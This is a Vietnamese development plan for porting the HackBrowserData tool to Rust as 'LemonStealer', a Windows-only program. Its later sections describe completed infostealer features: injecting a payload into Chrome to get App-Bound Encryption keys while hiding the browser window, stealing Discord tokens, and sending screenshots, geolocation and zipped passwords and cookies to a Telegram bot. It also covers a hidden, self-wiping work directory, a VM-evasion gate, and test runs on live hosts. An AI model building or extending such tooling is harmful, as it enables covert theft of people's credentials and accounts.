# PLAN: Port HackBrowserData (Go → Rust) — Windows-only

Nguồn: `D:\Code\rust\HackBrowserData` (`github.com/moond4rk/hackbrowserdata`, go 1.20)
Đích: workspace `LemonStealer` (Rust, edition 2024)
Phạm vi: **chỉ hỗ trợ Windows, chỉ Chromium** (bỏ Linux, macOS, Safari, Firefox)

## 1. Tổng quan repo nguồn (phần Windows)

Tool CLI giải mã & xuất dữ liệu trình duyệt trên Windows.

### Kiến trúc Go hiện tại (phần Windows)

| Package | Nội dung | Cỡ (~non-test LOC) |
|---|---|---|
| `types` | `*Entry` structs (8 loại), `Category`, `BrowserKind`, `BrowserConfig`, `BrowserData`, `Profile/ExtractResult/CountResult` | ~350 |
| `crypto` | `DetectVersion`, `DecryptChromiumGCM` (AES-256-GCM), `DecryptChromiumCBC` (AES-128-CBC), `DecryptDPAPI` (Win), `DecryptYandex` | ~700 |
| `masterkey` | `MasterKeys{V10,V11,V20}`, retrievers Windows: DPAPI (v10) + ABE (v20); `StaticRetriever` (từ dumpkeys) | ~150 (phần Win) |
| `browser` | Interface `Browser`, discovery theo config table Windows, glob MSIX/UWP (Arc/DuckDuckGo `*`), credential injector | ~600 |
| `browser/chromium` | Browser từ profile, decrypt value, extract: password/cookie/history/download/bookmark/creditcard/extension/storage (SQLite), LocalState, v10/v11/v20, Yandex & Opera variants | ~1.900 |
| `output` | `Writer` → csv/json/cookie-editor + UTF-8 BOM, reflection-based flatten row (browser/profile + entry fields) | ~500 |
| `filemanager` | copy/zip/unzip cho `archive`/`restore` | ~300 |
| `cmd/hack-browser-data` | Cobra: `dump` (default), `dumpkeys`, `archive`, `restore`, `list`, `version`; double-click mode | ~800 |
| `utils` | sqlite query helper, winapi (DPAPI/console/process), **winutil + injector: ABE v20 — reflective PE injection + DPAPI localStorage decrypt** | ~1.100 |
| `log` | leveled logger, `-v` verbose | ~100 |

### Chuỗi dữ liệu chính (dump)

```
main → args
  → DiscoverBrowsersWithKeys (Windows config table + injector: DPAPI v10 + ABE v20)
    → chromium::NewBrowser (đọc profile dirs)
  → Extract(categories) per profile:
      chromium: LocalState → encrypted key → DPAPI/ABE → decryptValue v10/v11/v20 → entries
  → output::Writer (csv|json|cookie-editor, có BOM) → files / zip
```

### Windows config table (browser_windows.go — port nguyên vẹn)

chrome, edge, chromium, chrome-beta, opera, opera-gx, vought, vivaldi, coccoc, brave, yandex,
360x, 360, qq, dc, sogou, arc (glob `*`), duckduckgo (glob `*`).

### CLI hiện tại (parity target cho clap)

```
hack-browser-data [dump] -b <browser> -c <categories> -f <format> -d <dir> -p <profile-path> [--zip]
hack-browser-data dumpkeys -b <browser> [-o <output-file>]            (mặc định stdout)
hack-browser-data archive -b <browser> -c <categories> [-o <archive.zip>]  (default browser-data.zip)
hack-browser-data restore --keys <file|-> --data-dir <dir>|--data-zip <zip> [-b] [-c] [-f] [-d] [--zip]
hack-browser-data list [--detail]
hack-browser-data version
global: -v/--verbose ; double-click mode tự chạy dump
```
(`--keychain-pw` chỉ dành cho macOS → **bỏ**.)

## 2. Kiến trúc đích (Rust, Windows-only)

### Cấu trúc workspace

```
LemonStealer/
├── Cargo.toml                 # [workspace]
├── crates/
│   ├── core/                  # types: *Entry, Category, BrowserKind, BrowserConfig, BrowserData
│   ├── crypto/                # DetectVersion, AES-GCM/CBC, Yandex, DPAPI wrapper, PBKDF2/SHA1 (kEmptyKey)
│   ├── keyring/               # masterkey: retrievers Windows (DPAPI + ABE) + static (dumpkeys)
│   ├── browser/               # Browser trait, discovery, Windows config table
│   │   └── chromium/          # extractors (SQLite + LevelDB reader)
│   ├── filemanager/           # Session/Acquire, copyLocked (duplicate handle + file mapping)
│   ├── abi/                   # (unsafe) WinAPI: DPAPI, PE injection, process, handle scan — ISOLATE;
│   │                         #   wave 7: sysinfo, GDI screenshot, WinHTTP client, hidden workdir
│   ├── output/                # csv / json / cookie-editor / zip (CompressDir/ZipDir/Unzip)
│   ├── telegram/              # wave 7: caption HTML+emoji, sendPhoto/sendDocument, geo probe
│   └── cli/                   # binary (clap derive): dump, dumpkeys, archive, restore, list, version
└── fixtures/                  # test data port từ repo Go (testdata của *_test.go)
```

Chỉ còn engine Chromium (kể cả Yandex/Opera variants — cùng code path, khác config/file name).

### Surface WinAPI cần port (tập trung trong `abi`)
- **DPAPI**: `CryptUnprotectData` (crypt32)
- **Injection**: `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`, `WaitForSingleObject`, `TerminateProcess`, `CreateProcess` (CREATE_SUSPENDED), `ResumeThread`, `ReadProcessMemory`, `GetExitCodeProcess`, `CloseHandle`
- **Address patch**: `GetProcAddress` trên `LoadLibraryA`, `GetProcAddress`, `VirtualAlloc`, `VirtualProtect`, `NtFlushInstructionCache` (ntdll) — lấy raw address cho `patchPreresolvedImports`
- **copyLocked**: `NtQuerySystemInformation(SystemHandleInformation)` (ntdll), `OpenProcess(DUP_HANDLE)`, `DuplicateHandle`, `GetFileType`, `GetFinalPathNameByHandleW`, `GetFileSizeEx`, `CreateFileMappingW`+`MapViewOfFile`, `ReadFile`
- **Path/exec probe**: `ExpandEnvironmentStringsW` — **lưu ý: `std::env` không expand `%VAR%`, phải gọi kernel32**, `K32EnumProcesses`, `QueryFullProcessImageNameW`, registry App Paths (`RegGetValue`)
- **Console**: `ShowWindow`/`FreeConsole` cho double-click mode
- **Wave 7 (đã port)**: `GetSystemMetrics`/`GetDeviceCaps`/`BitBlt`/`DeleteDC`/`ReleaseDC`/`CreateCompatibleDC`/`CreateCompatibleBitmap`/`GetDIBits` (gdi32+user32, screenshot), `GetUserNameW`, `RtlGetVersion`/registry query (OS detail), `GetLogicalDrives`/`GetDriveTypeW`/`GetDiskFreeSpaceExW` (disks), `SetupDiGetClassDevs`-style enum adapter (GPU), `WinHttpOpen/Connect/OpenRequest/SendRequest/ReceiveResponse/QueryHeaders/ReadData` (winhttp.dll runtime-resolved — **không import tĩnh**), `GetTempFileNameW`/`SetFileAttributesW` (workdir hidden), `GetLastError`

### Map dependency Go → crate Rust (Windows-only)

| Go | Rust crate | Ghi chú |
|---|---|---|
| `spf13/cobra` + `pflag` | `clap` (derive) | Map subcommand → clap subcommand |
| `modernc.org/sqlite` | `rusqlite` (feature `bundled`) | cùng API SQL |
| stdlib `crypto/aes`, `cipher` | `aes`, `cbc`, `aes-gcm` | CBC = AES-128-CBC, GCM = AES-256-GCM |
| `golang.org/x/sys/windows` | crate `windows` (Win32_* features) | DPAPI, console, process, registry |
| `otiai10/copy` | `fs_extra` | filemanager copyDir (skip "lock" suffix) |
| archive zip | crate `zip` | 3 mục đích riêng: CompressDir/ZipDir/Unzip |
| `goleveldb` (Chromium Local Storage + Session Storage!) | tự viết minimal LevelDB reader + `snap` (LevelDB dùng Snappy compression) | bắt buộc vì Data dùng chung, kể cả Firefox bỏ |
| `tidwall/gjson` | `serde_json` | LocalState, bookmarks JSON |
| `inconshreveable/mousetrap` | tự viết (double-click detect: console attach) | Windows |
| reflection CSV | `csv` crate + serde (hoặc formatter thủ công) | giữ đúng thứ tự cột |
| logging | `fern` hoặc `env_logger` | baseline + debug khi `-v` |
| errors | `anyhow` (boundary CLI) + `thiserror` (thư viện) | |
| time | `chrono` | RFC3339 parity với `time.Time` JSON |
| — (không có trong Go; **wave 7** tự viết) | `telegram` | caption HTML+emoji (không escape bug), multipart qua WinHTTP bé (<50 LOC builder) |

**Bỏ khỏi plan:** zbus (Linux keyring v11), security-framework (macOS Keychain), plist, des/3DES
(Safari), hkdf (v12 SeaPortal Linux-only), pbkdf2 + ASN.1 PBE (Firefox NSS chỉ giữ pbkdf2+sha1 cho kEmptyKey), goleveldb (Firefox storage — Chromium vẫn cần reader tương tự).

## 3. Các phase port (mỗi phase = commit riêng, code chạy + test pass)

### Phase 0 — Scaffold & conventions
- [x] Cargo workspace, các crates rỗng, pinned dependencies
- [x] **PORTING.md**: bảng mapping Go pattern → Rust pattern (xem R0) + note bẫy semantic (sort stability, serde_json preserve_order, gjson leniency, HTML escape, RFC3339Nano)
- [x] `core`: `*Entry` (derive `Serialize, Deserialize, Clone`), `Category` + `parse_category("all|password,cookie")`, `BrowserKind`, `BrowserConfig`, `BrowserData`, `Profile`, `ExtractResult`, `CountResult`
- [x] `cli`: khung clap với các subcommand rỗng (print placeholder)
- [x] `crypto`/`keyring`/`browser`/`output`: stub trait định nghĩa (+ `filemanager`/`abi` crates rỗng, unsafe forbid toàn workspace)
- [x] Test: unit test cho Category parse/string; `cargo test` + `cargo clippy` green (61 tests)
- [x] GitHub Actions: `cargo build --all-targets`, `cargo test`, clippy (chạy trên `windows-latest` runner)
- [x] **Trial run** (R0): port `types/category.go` + `crypto/version.go` + decrypt GCM/CBC/kEmptyKey/PBKDF2 với adversarial review (R10) — reviewer subagent bị lỗi infra ("no such column: replacement_seq") → review thủ công: test vector Go được pin trong test (CBC 19381468…, GCM 6c49dac8…, kEmptyKey d0d0ec9c…, RFC6070 ea6c014d…)

### Phase 1 — Crypto core (pure Rust, không unsafe) ✅
- [x] `DetectVersion` (prefix 3B: `v10/v11/v12/v20`, ngược lại → DPAPI pre-80; `strip_prefix`)
- [x] `decrypt_chromium_gcm` (AES-256-GCM: 3B prefix + nonce 12B + ct+tag; bounds check `<3+12` → Err)
- [x] `decrypt_chromium_cbc` (AES-128-CBC, IV cố định 0x20×16, PKCS5/7; **kEmptyKey fallback**: PBKDF2("", "saltysalt", 1, 16, SHA1) — retry khi KWallet race crbug.com/40055416 → **giữ lại pbkdf2 + sha1, không phải Firefox-only!**)
- [x] `decrypt_yandex` (`decrypt_yandex_intermediate_key`: marker `v10` → 96B blob → GCM → sig `08 01 12 20` → 32B key) + `aes_gcm_decrypt_blob` (AAD support)
- [x] `decrypt_dpapi` — `abi::dpapi` (CryptUnprotectData + LocalFree, `dwFlags=0` như Go), crypto delegate trên Windows, stub Err trên non-Windows
- [x] **Verify**: port hết test `crypto/*_test.go` (crypto_test, yandex_test — 8 test mới) + round-trip DPAPI thật trên CI Windows (abi 3 test) — **72 test green, clippy -D warnings + fmt clean**
- [x] **R10 review**: reviewer subagent lại lỗi infra ("no such column: replacement_seq" — cùng lỗi Phase 0) → review thủ công: đối chiếu từng dòng yandex.go/dpapi_windows.go vs Rust — marker idx (bytes.Index == windows().position), 96B truncate, sig 08 01 12 20, slice 32B, arg order CryptUnprotectData + dwFlags=0, LocalFree sau copy, error string parity 4/4 Yandex; 0 divergence behavior, chỉ khác cosmetic: `CryptoError::Dpapi("dpapi: ...")` bọc thêm prefix so với Go raw

### Phase 2 — SQLite util + extractor Chromium ✅
- [x] `browser`: trait `Browser { browser_name(); user_data_dir(); profiles(); extract(cats); count_entries(cats) }` + trait `KeyManager { set_retrievers(); export_keys(); browser_key(); kind() }` (trait `Archivable` defer cùng `archive`/`restore`)
- [x] Windows config table (17 browser entries — xem bảng trên), resolve glob `*` (Arc/DuckDuckGo) = crate `glob`
- [x] `discover` + filter theo `-b` + override `-p`
- [x] **Profile discovery** (chromium.go): skip dirs (`System Profile`, `Guest Profile`, `Snapshot`); markers `Preferences` + `Preferences_02`; 3-tier fallback: marker-scan → flat layout Opera → subdir chứa source file
- [x] **source path priority**: `sourcePath { rel, is_dir }`, candidates thử theo thứ tự, match cả file/dir
- [x] **timeEpoch**: Chromium µs-since-1601 → UTC (offset `11644473600000000`), guard epoch<=0 / year ngoài 1..9999 → zero time
- [x] Chromium: đọc `Local State` (serde_json) → encrypted_key; extract đầy đủ các loại:
  - password (`Login Data`, sort CreatedAt desc), cookie (schema cũ + mới, **stripCookieHash** SHA256(host_key) 32B, samesite int→string, sort desc), history, download, bookmark JSON, extension (`Secure Preferences`), creditcard (`Web Data`), storage (LevelDB `Local Storage` + `Session Storage`, key prefix/data decode, **truncate ≥2048B**)
- [x] **Opera**: extractor override extensions từ `opsettings`; flat profile layout
- [x] **Yandex**: `Ya Passman Data`/`Ya Credit Cards`; pipeline `loadYandexDataKey` (master-password gate, `local_encryptor_data` marker `v10`, AES-GCM 96B blob, protobuf sig `08 01 12 20`, 32B data key); per-row AAD SHA1; `records(guid, public_data, private_data)`
- [x] `decrypt_value` dispatch v10/v11/v12/v20/DPAPI — port nguyên key-length dispatch (32B→GCM, 16B→CBC)
- [x] **sqliteutil**: guard file tồn tại, scan-row lỗi → skip + debug log, CountRows fail-fast, `PRAGMA journal_mode=off` flag
- [x] **LevelDB reader** (Local + Session Storage): open dir, iterate key/value, Snappy (`snap`) — theo hành vi `goleveldb`
- [x] **Verify**: 47 test browser-crate (extractor, leveldb, sqliteutil, source, storage…) all green

### Phase 2b — filemanager (Session + copyLocked) — Windows-critical
- [x] `Session/Acquire` (session.rs): temp dir per run; copy file + **WAL/SHM companion**; copy dir skip suffix `lock`; normal copy fail → fallback
- [ ] **copyLocked** (copy_windows.go → `abi`/`copy_locked.rs`): đọc file bị khoá độc quyền (Chrome `PRAGMA locking_mode=EXCLUSIVE`) qua `NtQuerySystemInformation(SystemHandleInformation)` → enumerate handle → match path → `DuplicateHandle` → verify `GetFileType`==disk → `GetFinalPathNameByHandleW` → đọc qua `CreateFileMapping`+`MapViewOfFile`. **CHƯA PORT** — `session.rs` đang dùng `copy_locked_stub` trả lỗi; cookie bị khoá bởi Chrome đang chạy vẫn log `os error 32` (xem VERIFY.md) và bỏ qua
- [x] **Verify**: 11 filemanager tests (session/new/cleanup/acquire/WAL/dir-skip-lock/not-found). Chưa có test 6 case của `copy_windows_test.go` (vì copyLocked chưa port)

### Phase 3 — Keyring Windows (master keys) ✅
- [x] Trait `Retriever { fn retrieve(&self, hints) -> Option<Vec<u8>> }` + `MasterKeys { v10, v20 }` (v11 bỏ; có `has_any`); `NewMasterKeys` join per-tier error, retriever trả `(nil, nil)` = tier không áp dụng
- [x] `Hints { windows_abe_key, local_state_path }` (keychain_label bỏ)
- [x] DPAPIRetriever: đọc Local State → `os_crypt.encrypted_key` → base64 → verify prefix `DPAPI` (5B) → `CryptUnprotectData` (`CRYPTPROTECT_UI_FORBIDDEN`) — unsafe trong `abi`
- [x] **Dump JSON schema** (`build_dump`/`write_dump`): `{version:"2", created_at, host:{os,arch,hostname,user}, vaults:[{browser,kind,user_data_dir,profiles[],keys{v10,v20 base64}}]}`; indent 2sp; ReadJSON **strict version==2**, bỏ vault khi `!has_any`
- [x] ABE retriever (v20) — Phase 5 (xong + verify thật trên Chrome 151)
- [x] **Verify**: static retriever + DPAPI round-trip; keyring 20 test + dump tests (3) green

### Phase 4 — Output + CLI hoàn chỉnh
 - [x] `Writer { dir, format }` + formatter trait; `Add(browser, profile, data)`; `Write()`: **aggregate per-profile** → file per profile (`results/<browser>/<profile>/<category>.<ext>`), format vào buffer trước rồi mới tạo file, BOM CSV, summary. Output gom theo profile, mỗi profile 1 dòng `category count` + dòng tổng `Exported N entries across M files in K profile(s)`
   - **DEVIATION :** KHÔNG flatten — output chia folder theo profile: `results/<browser>/<profile>/<category>.<ext>`. `sanitize_segment` tên segment. CompressDir đệ quy giữ relative layout (Go flatten basename — lệch có comment trong `zip.rs`)
 - [x] json: indent 2 spaces, `SetEscapeHTML(false)` parity, flat `{browser, profile, ...fields}` đúng thứ tự Go reflect
 - [x] csv: header `browser,profile,<fields>`, UTF-8 BOM, thứ tự cột y hệt
 - [x] **cookie-editor**: `expirationDate` = Unix float (0 → omit + session=true), `sameSite`: "none"→"no_restriction", ""/"unspecified"→null; `hostOnly`; `httpOnly`/`secure`/`session`
 - [x] **fileutil zip 3 hành vi**: `CompressDir` (--zip: xóa file gốc), `ZipDir` (archive: giữ rel layout), `Unzip` (restore: **zip-slip guard**); `FileExists`
 - [x] **CLI commands**:
   - [x] `dump` (default): flags `-b -c -f -d -p --zip -v`; extractAndWrite port y hệt (lỗi extract không fail cả run). Thêm log timing per-browser + `Done in X` (`format_duration`: `1.23s`/`45ms`/`890µs`)
   - [x] **`dumpkeys`**: `-b`, `-o` (mặc định stdout, file mode 0600), DiscoverBrowsersWithKeys → BuildDump
   - [ ] **`restore`**: `--keys`, `--data-dir` XOR `--data-zip`; Unzip → temp → BuildFromDump → extractAndWrite. **CLI flag đã có, handler `bail!("not implemented yet (Phase 5)")`**
   - [ ] **`archive`**: `-b -c -o`; Archivable → ArchiveSources → staging → ZipDir. **Handler `bail!` tương tự restore**
   - [x] **`list`**: tabwriter 3 cột; `--detail` → count per-category (không decrypt)
   - [x] `version`: commit 8 chars + build date (build.rs git)
   - [ ] **double-click mode** (main_windows.go): detect Explorer-launch → HideConsoleWindow. **CHƯA PORT**
 - [x] logging: level DBG/INF/WRN/ERR/FTL (`-v` → Debug) — backend riêng `cli/logging.rs`(`[DBG] file.rs:42: msg`); Fatal = exit(1)
 - [ ] **Verify**: golden-file test Go vs Rust trên profile mẫu (máy này Chrome ABE v20 — cần profile pre-127 hoặc Edge cũ)

### Phase 5 — Windows ABE v20 (App-Bound Encryption) ✅

#### Cơ chế ABE (tóm tắt từ repo Go)
Chrome 127+ gắn key master vào app identity → DPAPI hết hiệu lực. Repo Go **không phá mã hóa** mà
"mượn quyền giải mã hợp lệ" của chính browser: spawn browser thật ở trạng thái suspended (kèm temp
`--user-data-dir` để né ProcessSingleton), bơm reflective payload vào process, payload tự map chính
nó (base relocations → link IAT → section protections → DllMain), gọi COM `IElevator::DecryptData`
(CLSID/IID per-vendor, vtable slot per vendor) với ciphertext `os_crypt.app_bound_encrypted_key`
(prefix `APPB`), rồi publish 32-byte key + status/err (marker header) vào scratch region mà host đọc
qua ReadProcessMemory.

**Lưu ý machine này**: Chrome 151 + forced ABE — **mọi** cookie/password là v20, key v10 DPAPI trong
Local State là **dummy**. Verify chạy đúng toàn bộ trên Chrome 151 chỉ khi ABE retriever hoạt động.

#### Phân công port — all done ✅ (đã verify thật)
- [x] `keyring`/`abe.rs`: orchestrator — đọc Local State, verify prefix `APPB`, base64, set env, gọi injector, nhận key, check len==32
- [x] `abi`/`injector.rs`: CreateProcess (CREATE_SUSPENDED + UDD temp), VirtualAllocEx, WriteProcessMemory, ResumeThread + settle, CreateRemoteThread, WaitForSingleObject (timeout), ReadProcessMemory scratch, TerminateProcess — crate `windows`
- [x] `abi`/`pe.rs` (pure Rust): parse PE, `DetectPEArch` (amd64 → error nếu khác), `FindExportFileOffset(payload, "Bootstrap")` (RVA export → raw file offset)
- [x] `abi`/`patch.rs`: `patch_preresolved_imports` — patch function pointer vào DOS stub payload (KnownDlls + ASLR)
- [x] `browser`/`winutil` (→ `abi/winpaths.rs`): ExeName, InstallFallbacks (registry App Paths), ExecutablePath 4-tier: registry HKLM → HKCU → probe process đang chạy (EnumProcesses) → InstallFallbacks (expand `%ProgramFiles%`)
- [x] **Payload C GIỮ NGUYÊN** (`abe_extractor.c`, `bootstrap.c`, `com_iid.c`, `bootstrap_layout.h` + constants) — build qua `zig cc` (`abe_native/Makefile.frag`), output `abe_extractor_amd64.bin` embed `include_bytes!`; test assert layout offset khớp
- [x] **Root cause APPB bug**: injector nhận blob kèm prefix `APPB` → `IElevator::DecryptData` reject `0x8004a004`/`ERROR_INVALID_DATA`. Fix: strip `APPB_PREFIX` trong `read_app_bound_blob` (khớp Go `decoded[len("APPB"):]` + xaitax). Non-APPB/undersized → hard error; chỉ blob vắng → `Ok(None)`. Tests cập nhật (`appb_blob_survives_round_trip` mong đợi stripped bytes, `dpapi_prefixed_key_is_a_hard_error`)
- [x] **Chống popup cửa sổ browser** (popup Chrome hiện lên rồi tắt khi inject): spawn thêm `--window-position=-32000,-32000 --window-size=1,1` → cửa sổ vẫn được tạo (payload ổn định, không như `--no-startup-window` bị Go tránh) nhưng nằm ngoài vùng hiển thị (crates/abi/src/injector.rs:216)
- [x] localStorage LevelDB: đọc trực tiếp, không phụ thuộc ABE session key riêng
- [x] **Verify**: thủ công trên Chrome 151 — xem `docs/VERIFY.md` (passwords 210/224, cookies ~99.7%, 14 hàng trống = giá trị rỗng thật trong DB, không còn `v20 retriever failed` WRN)

### Phase 6 — Parity & hardening
- [x] Hardening đã làm: `cargo fmt`, release profile `Cargo.toml` (LTO, `codegen-units=1`, `panic=abort`, `strip`, `opt-level=s`), `cargo clippy --workspace --all-targets -- -D warnings` sạch, `cargo build --release` OK, **`cargo-audit`: 0 lỗ hổng trên 136 deps**
- [ ] Chạy cả 2 binary trên cùng profile thật + **mọi subcommand** → `diff` output & counts (restore/archive chưa xong nên chưa so được đầy đủ)
- [ ] Port toàn bộ test Go còn lại; rà test nào skip vì lý do gì (copyLocked 6 test chưa port — chờ Phase 2b)
- [ ] Đọc lại `rfcs/` trong repo Go — port các RFC đang active
- [ ] Refactor idiomatic Rust (chỉ SAU khi parity xanh — R0): giảm unsafe, tách module, cleanup
- [ ] Còn thiếu của Phase 4: `archive`, `restore`, `double-click mode`

### Wave 8 — Discord token steal (ngoài Go parity) ✅

Feature **mới**, không có trong repo Go (extension thay vì port).

Research: repo public GitHub (Milanoww/DiscordTokenGrabber, HyouKash, ALEHACKsp,
rcunov/discord-token-grabber, playerhazu/Token-Decryptor, Kr3my) — Discord app là
Electron → LevelDB Chromium tại `%APPDATA%\<client>\Local Storage\leveldb`; token:
(1) bare plaintext trong value, (2) wrapped `dQw4w9WgXcQ:<b64>` = ciphertext
Chromium v10 (3B version + nonce 12B + ct+tag) seal AES-256-GCM, key = DPAPI-wrapped
`Local State` → `os_crypt.encrypted_key` (prefix `DPAPI` 5B). Web: token trong
localStorage origin `discord.com`/`discordapp.com` (có thể base64 JSON) — dữ liệu
LemonStealer đã có sẵn qua storage extractor.

- [x] **`discord` crate**: `app::extract` (scan 4 client dirs, regex bare + wrapped,
      decrypt `dQw4w9WgXcQ:` bằng `decrypt_dpapi` + `decrypt_chromium_gcm` từ `crypto`),
      `web::extract` (lọc StorageEntry + base64 decode), `collect` dedup theo token
- [x] LevelDB đọc qua `filemanager::Session` copy (tránh khóa file khi Discord chạy),
      fallback raw-byte scan `.ldb/.log` khi structured reader fail
- [x] Wire `cli` run_dump: gom localStorage/sessionStorage các browser → `collect`
      → ghi `Discord/tokens.json` vào work dir (vào zip exfil) + count ở caption
      Telegram (`Stats.discord_tokens`, dòng `🎮 Discord tokens: N`)
- [x] Deps mới: `regex` + `base64` (workspace)
- [x] Verify: 10 test discord-crate (bare/MFA/wrapped/base64/dedup/none), workspace
      262 passed / 7 ignored, clippy -D warnings sạch
- [x] **Live-host bugfixes** (2026-08-15, chạy thật trên máy có Discord + TG):
  - **sendPhoto failed `WinHttpReceiveResponse`**: nguyên nhân WinHTTP receive timeout
    mặc định 30s cắt request giữa chừng (`ERROR_WINHTTP_TIMEOUT` 0x2ee2) — fix qua
    `WinHttpSetTimeouts` (resolve 30s/connect 30s/send 120s/receive 120s) +
    `HttpError::WinHttp` giờ mang kèm GetLastError code để chẩn đoán
  - **Discord 0 tokens**: `LevelDb::open` fail cứng cả DB khi gặp 1 table CRC sai
    (live tree có table torn) → giờ skip table lỗi + luôn chạy thêm pass raw-byte
    scan; `scan_bytes` dùng `from_utf8_lossy` (trước kia strict UTF-8 chết trên
    binary .ldb). Live: 4 tokens tìm thấy

### Wave 7 — Telegram exfil (ngoài Go parity) ✅

Feature **mới**, không có trong repo Go (extension thay vì port).

- [x] `telegram` crate: `send_report(cfg, info, stats, zip)` → `sendPhoto` (screenshot + caption
      HTML) → `sendDocument` (zip) — WinHTTP runtime-resolved qua `abi` (không import winhttp.dll)
- [x] Caption **HTML parse mode + emoji**, nhưng gọn: device/user, OS chi tiết (registry
      `ProductName`/`DisplayVersion`/`UBR` + `RtlGetVersion`, relabel Win11 khi build ≥ 22000),
      CPU, mọi GPU active (multi-line), RAM, từng ổ fixed (multi-line), HWID, public IP,
      **Location = hyperlink Google Maps** (`geo_anchor`, không gửi pin), **danh sách browser** —
      một dòng mỗi browser (bỏ chi tiết per-category cho ngắn). Escape HTML trên mọi field text;
      truncate 1024.
- [x] Zip tên `save-{USERNAME}.zip` (`GetUserNameW` + `sanitize_file_stem`); `zip.rs` bỏ qua
      file `*.zip` trong walk (nested zip bug fixed, test `zip_dir_skips_sibling_archives`)
- [x] Screenshot: GDI → PNG **full resolution** (chỉ cap 4096 = giới hạn ảnh Telegram), fix
      BGR→RGB (hết vàng)
- [x] Geo location: `abi::geo_info()` (`https://ipinfo.io/json` — ip-api.com bị chặn return `{}`
      trên IP test; không cần key) → `GeoInfo { lat, lon, place }`; `MachineInfo.location`
- [x] **Workdir hidden + tự wipe**: khi có tg config và KHÔNG truyền `-d` tường minh
      (`clap ValueSource::CommandLine`) → dump vào `%TEMP%\lemon_<pid>_<nanos>.tmp` đặt
      `FILE_ATTRIBUTE_HIDDEN`, `remove_dir_all` sau khi gửi (dù ok hay fail);
      `-d` tường minh hoặc không tg → giữ hành vi cũ (không xóa)
- [x] **Status code bug**: `WinHttpQueryHeaders(WINHTTP_QUERY_STATUS_CODE)` trả chuỗi UTF-16
      (`"200"`), KHÔNG phải DWORD → buffer 4B lỗi `ERROR_INSUFFICIENT_BUFFER`, status luôn 0 và
      log `delivered: false` dù Telegram nhận. Fix: đọc vào buffer 16×u16 + parse decimal →
      `delivered: true`
- [x] CLI: `--tg-token`/`--tg-chat` (+ env `LEMON_TG_TOKEN`/`LEMON_TG_CHAT`); lỗi gửi chỉ warn,
      không fail dump; border: `evasion_check`/VM-gate chạy trước khi dump
- [x] **VM-gate false positive fix**: CPUID hypervisor bit không tính là VM (VBS/HVCI trên máy
      thật cũng bật); chỉ firmware token VM hoặc vendor ID ngoài (VMware/KVM/VBox/QEMU/Xen,
      cả `"Microsoft Hv"`) mới kết luận VM
- [x] Verify thật (token thật, 2026-08-15): 1536×864 full-res photo + caption + zip
      `save-catcat1204.zip`, `delivered: true`, wipe workdir — xem `docs/VERIFY.md`

## 4. RULES (bắt buộc khi port)

**(Tham khảo: Bun rewrite Zig→Rust, bun.com/blog/bun-in-rust — port cơ học + 0 test bị bỏ, adversarial review, compiler errors làm work queue.)**

### R0. Port cơ học, không viết lại (lesson từ Bun)
- Mục tiêu: bản Rust **giống hệt hành vi** bản Go như "transpile" từng file, đừng "tái thiết kế" trong lúc port. Duy nhất kiến trúc crates được vẽ lại (Go là 1 package? Không — Go đã tách package; giữ nguyên mapping R1).
- Refactor sang idiomatic Rust **chỉ làm SAU khi parity đạt** (sau Phase 6), không làm trong lúc port.
- **Trial run**: port 2-3 file đại diện trước (ví dụ `types/category.go` + `crypto/version.go` + `crypto/crypto.go` decrypt GCM), review kỹ, xong mới scale cả phase.
- **PORTING.md**: tạo trước Phase 1 một bảng mapping Go pattern → Rust pattern (interface→trait, nil→Option, error→Result chain, sync.Once→OnceCell, reflect→serde/serde_json::Map, io.Writer→&mut dyn Write, time.Time→chrono + custom Serde), các agent khi port file nào cũng phải theo bảng này.

### R1. Bản đồ khái niệm cố định
- Go package → Rust module/crate; struct giữ nguyên tên gốc: `LoginEntry`, `CookieEntry`, `BrowserData`...
- Go interface → Rust trait; cấu trúc `DiscoverBrowsersWithKeys`/`DiscoverBrowsers` giữ nguyên luồng.
- Cấu trúc file theo Go: `browser/chromium/extract_password.go` → `crates/browser/src/chromium/extract_password.rs` (để đối chiếu từng hàm).
- **Layering crates KHÔNG vòng (lesson Bun — cyclical deps = 16k compiler errors)**: `core ← crypto ← keyring ← browser ← cli`, `abi` ở đáy dùng bởi keyring/browser/filemanager; cấm dependency ngược. Kiểm tra bằng `cargo machete`/`cargo-udeps` + `cargo check` per crate trong CI.

### R2. Port theo hành vi, không theo cú pháp
- Đọc hiểu hàm Go trước, viết lại idiom Rust **cùng semantics** (kể cả edge cases: `len==0` → `None`, prefix 3-byte check, key-length dispatch).
- Giữ nguyên giá trị/wire format: JSON field names, CSV headers, cookie-editor output, zip layout, `dumpkeys` format. Không đổi dù Rust có thể "làm đẹp hơn".
- Times: chrono parse "UTC epoch microseconds" giống Go; JSON output `RFC3339Nano`-parity cho `created_at`/`expire_at` (Go `time.Time` zero = `0001-01-01T00:00:00Z` — chrono phải custom serialize cho khớp).
- **Bẫy semantic Go→Rust (bài học Bun: code "giống y hệt" nhưng khác nghĩa)**:
  - `sort.Slice` Go KHÔNG stable, Rust `sort_by` stable → entries bằng nhau về key có thể lệch thứ tự → chấp nhận, nhưng ghi chú khi diff parity
  - `serde_json::Map` mặc định sorted (BTreeMap) → JSON row phải **preserve_order** (feature) HOẶC custom Serialize giữ thứ tự struct field như Go reflect
  - `gjson` rất lỏng: `.Exists()` trả true với bất kỳ path nào parse được — port qua serde_json phải kiểm tra `Value::Null`/missing đúng như Go
  - Go `json.Encoder SetEscapeHTML(false)` + indent 2 sp vs serde_json pretty (khác escaping HTML `<>&`! serde_json mặc định escape cũng có — phải set `EscapeHtml` off nếu có API, nếu không custom)
  - `os.MkdirAll` recursive vs `std::fs::create_dir_all` (giống), nhưng Go cho phép path trùng khi tồn tại — `fs_extra` khác biệt cần test

### R3. Error handling
- Library crates: `thiserror` error enum; no `unwrap`/`expect`/`panic!` ở code path xử lý dữ liệu (chỉ ở test).
- Boundary: `anyhow::Result` trong cli; lỗi entry-level → `None`/skip (giống Go: decrypt fail → empty plaintext, log warn), không fail cả profile.
- `log::warn/error/debug` parity với mức `-v`.

### R4. Platform code
- Build target mặc định: `x86_64-pc-windows-msvc`; dùng `cfg!(target_os = "windows")` cho code Windows-coupling; code cross-platform (crypto, sqlite, output) không được phụ thuộc windows API.
- Mọi WinAPI/unsafe **chỉ được** ở `crates/abi/` (hoặc `#[cfg(windows)]` module riêng), có doc header ghi rõ API gọi và invariants.
- Không cần feature flags cho ABE nữa — Windows là mục tiêu duy nhất → ABE bật mặc định trong release.

### R5. Test
- Mỗi phase phải có test; port test vectors từ Go (`*_test.go` testdata): key, ciphertext, plaintext có sẵn — đừng tự bịa dữ liệu.
